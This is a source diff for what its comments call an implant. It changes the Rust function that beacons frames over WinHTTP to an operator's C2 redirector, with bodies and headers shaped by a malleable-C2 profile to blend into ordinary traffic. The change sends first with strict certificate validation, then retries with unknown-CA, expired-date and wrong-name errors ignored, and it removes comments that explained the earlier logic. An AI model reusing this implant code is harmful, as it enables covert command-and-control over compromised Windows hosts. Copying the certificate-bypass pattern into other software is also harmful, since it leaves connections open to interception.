@@ -22,7 +22,7 @@ use core::ffi::c_void;
 const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;
 
 /// WinHttpSetOption option code: control certificate validation behavior.
-const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 32;
+const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31; // 0x1F, not 32
 /// Flags OR'd into WINHTTP_OPTION_SECURITY_FLAGS to ignore cert errors the
 /// redirector/self-signed infra would otherwise trip. Engagement-only: this
 /// trusts whatever cert the server presents, so MITM is possible — acceptable
@@ -213,49 +213,11 @@ pub unsafe fn post_frame(
         (fns.close_handle)(session);
         return None;
     }
-    // For HTTPS, relax certificate validation (engagement reality: the redirector
-    // frequently presents a self-signed cert). Only if WinHttpSetOption resolved.
-    // If it resolved but FAILED to set the option, we treat that as fatal:
-    // proceeding would send the request with strict validation, the self-signed
-    // redirector's handshake would fail, post_frame would return None, and the
-    // beacon would retry forever with no indication WHY — a silent death. Fail
-    // fast here so the operator sees the request never land.
-    if use_tls {
-        if let Some(set_option) = fns.set_option {
-            let flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
-                | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-                | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-            if set_option(
-                req,
-                WINHTTP_OPTION_SECURITY_FLAGS,
-                &flags as *const u32 as *const u8,
-                4,
-            ) == 0
-            {
-                // WinHttpSetOption failed (BOOL == 0). Bail rather than send
-                // with strict validation.
-                (fns.close_handle)(req);
-                (fns.close_handle)(conn);
-                (fns.close_handle)(session);
-                return None;
-            }
-        }
-        // If set_option is None (WinHttpSetOption export unresolved), proceed —
-        // TLS still works for valid-CA certs; only self-signed would fail at
-        // handshake, and that surfaces as a normal retry, not a silent stall.
-    }
-    // Apply the profile's http-post CLIENT envelope to the request body (the
-    // malleable-C2 request direction). With no profile the baked steps are empty
-    // and `encode` is the identity, so `wire_body` == `body` (a fresh clone).
+    // ---- Envelope shaping (profile-driven, done BEFORE send) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
     let cheaders = crate::envelopes::post_client_headers();
     let shaped = nyx_profile::encode(&csteps, body);
-    // Where do the transformed bytes go? Print/UriAppend/None → the body (the
-    // common case). Header(name) → the named header, body empty (the http-get
-    // metadata-in-Cookie pattern — though the implant only POSTs, so http-post
-    // client.output rarely uses it). Parameter rides in a URL query the implant
-    // doesn't build, so fall back to the body (decode still sees the data).
     let (wire_body, data_header): (Vec<u8>, Option<(Vec<u8>, Vec<u8>)>) = match &cterm {
         Some(nyx_profile::Terminator::Header(name)) => {
             (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
@@ -263,8 +225,7 @@ pub unsafe fn post_frame(
         _ => (shaped, None),
     };
 
-    // Collect static client-block headers + (if header-terminator) the data
-    // header into one WinHttpAddRequestHeaders call (each "Name: Value\r\n").
+    // Collect static client-block headers + (if header-terminator) the data header.
     if let Some(add_req_headers) = fns.add_request_headers {
         let mut hdr: Vec<u8> = Vec::new();
         for &(n, v) in cheaders.iter() {
@@ -281,17 +242,22 @@ pub unsafe fn post_frame(
         }
         if !hdr.is_empty() {
             let hdr16 = to_utf16(&hdr);
-            // dwHeadersLength = explicit char count (EXCLUDING the null terminator
-            // to_utf16 appends) — NOT -1. A -1 null-terminated read would truncate
-            // the header mid-value if a transform ever emitted an embedded NUL.
             let hdr_len = (hdr16.len() - 1) as u32;
-            // dwModifiers = WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000).
             let _ = add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000);
         }
     }
 
-    // WinHttpSendRequest: optional-section headers omitted (added above);
-    // body is the envelope-shaped bytes (or empty for a header-terminator).
+    // ---- WinHttpSendRequest with TLS retry ----
+    // Canonical pattern for WinHTTP 5.1+ with self-signed certs:
+    //   1. Attempt with strict cert validation.
+    //   2. On failure, set SECURITY_FLAG_IGNORE_* and retry.
+    // NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
+    let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    let can_relax_cert = use_tls && fns.set_option.is_some();
+
+    // First attempt (strict cert validation).
     let ok = (fns.send_request)(
         req,
         core::ptr::null(),
@@ -301,7 +267,38 @@ pub unsafe fn post_frame(
         wire_body.len() as u32,
         0,
     );
-    if ok == 0 {
+    if ok == 0 && can_relax_cert {
+        let set_option = fns.set_option.unwrap();
+        if set_option(
+            req,
+            WINHTTP_OPTION_SECURITY_FLAGS,
+            &tls_flags as *const u32 as *const u8,
+            4,
+        ) != 0
+        {
+            // Retry with relaxed cert validation.
+            let retry_ok = (fns.send_request)(
+                req,
+                core::ptr::null(),
+                0,
+                wire_body.as_ptr(),
+                wire_body.len() as u32,
+                wire_body.len() as u32,
+                0,
+            );
+            if retry_ok == 0 {
+                (fns.close_handle)(req);
+                (fns.close_handle)(conn);
+                (fns.close_handle)(session);
+                return None;
+            }
+        } else {
+            (fns.close_handle)(req);
+            (fns.close_handle)(conn);
+            (fns.close_handle)(session);
+            return None;
+        }
+    } else if ok == 0 {
         (fns.close_handle)(req);
         (fns.close_handle)(conn);
         (fns.close_handle)(session);
